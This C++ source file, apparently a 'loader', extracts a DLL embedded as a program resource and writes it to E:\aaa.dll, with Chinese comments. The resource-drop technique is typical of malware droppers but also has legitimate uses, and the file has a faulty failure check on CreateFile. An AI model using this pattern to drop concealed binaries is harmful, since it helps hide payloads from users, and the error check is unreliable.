// Loder.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>
#include "resource.h"


bool CreateMyFile(const char* strFilePath, LPBYTE lpBuffer, DWORD dwSize)
{
	DWORD dwWritten;

	HANDLE hFile = CreateFile(strFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != NULL)
	{
		WriteFile(hFile, (LPCVOID)lpBuffer, dwSize, &dwWritten, NULL);
	}
	else
	{
		return false;
	}
	CloseHandle(hFile);
	return true;
}
//要释放的路径   资源ID            资源名
bool CreateEXE(const char* strFilePath, int nResourceID, const char* strResourceName)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize;
	LPBYTE p;
	// 查找所需的资源
	hResInfo = FindResource(NULL, MAKEINTRESOURCE(nResourceID), strResourceName);
	if (hResInfo == NULL)
	{
		//MessageBox(NULL, "查找资源失败！", "错误", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// 获得资源尺寸
	dwSize = SizeofResource(NULL, hResInfo);
	// 装载资源
	hResData = LoadResource(NULL, hResInfo);
	if (hResData == NULL)
	{
		//MessageBox(NULL, "装载资源失败！", "错误", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// 为数据分配空间
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize);
	if (p == NULL)
	{
		//MessageBox(NULL, "分配内存失败！", "错误", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// 复制资源数据
	CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);

	bool bRet = CreateMyFile(strFilePath, p, dwSize);
	if (!bRet)
	{
		GlobalFree((HGLOBAL)p);
		return false;
	}

	GlobalFree((HGLOBAL)p);

	return true;
}



int main()
{
	CreateEXE("E:\\aaa.dll", IDR_DLL1, "DLL");
}